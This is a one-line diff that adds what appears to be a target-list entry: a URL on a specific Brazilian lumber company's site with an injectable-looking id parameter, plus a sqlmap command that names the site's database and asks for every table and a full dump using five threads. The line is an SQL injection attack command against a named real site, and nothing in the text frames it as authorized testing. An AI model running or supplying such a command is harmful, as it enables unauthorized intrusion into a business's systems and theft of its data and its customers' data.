@@ -1,0 +1,1 @@
+https://www.alvesmadeiras.com.br/produtos?id=94 (GET)  # sqlmap.py -u https://www.alvesmadeiras.com.br/produtos?id=94 -D alvesmad_bd --tables --dump-all --threads 5 -v3
